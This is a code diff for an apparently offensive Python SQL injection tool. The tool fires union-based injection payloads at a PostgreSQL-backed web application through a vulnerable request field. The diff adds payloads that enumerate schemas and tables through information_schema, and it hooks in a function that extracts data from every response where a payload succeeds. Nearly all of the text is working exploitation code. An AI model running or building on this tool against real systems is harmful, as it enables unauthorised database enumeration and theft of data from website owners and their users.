@@ -2,6 +2,7 @@ import requests
 import sys
 from colorama import Fore, Style
 from utils import write_to_file, vulnerable, check_response
+from extract_data import extract_psql_data
 
 
 def test_postgresql_columns(url, http_method, data, vulnerable_field, file):
@@ -64,13 +65,15 @@ def exploit_union_based_postgresql(url, http_method, data, vulnerable_field, col
         "1, current_user, NULL",
         "1, current_database(), NULL",
         "1, current_query(), NULL",
-        "1, schema_name, NULL",
+        "1, schema_name, NULL FROM information_schema.schemata",
+        "1, table_name, NULL FROM information_schema.tables",
     ]
     for base_payload in payloads:
         payload = generate_payload_psql(base_payload, columns)
         response = send_payload_psql(url, http_method, data, vulnerable_field, payload)
         if check_response(response):
             print(f"{Fore.LIGHTGREEN_EX}[+] Payload success: {payload}{Style.RESET_ALL}")
+            extract_psql_data(response, file, payload, vulnerable_field)
         else:
             print(f"{Fore.RED}[-] Failed to send payload: {payload}{Style.RESET_ALL}")
 
@@ -88,4 +91,3 @@ def test_postgresql(url, http_method, data, vulnerable_field, file):
     if columns is None:
         return
     exploit_union_based_postgresql(url, http_method, data, vulnerable_field, columns, file)
-    sys.exit(1)
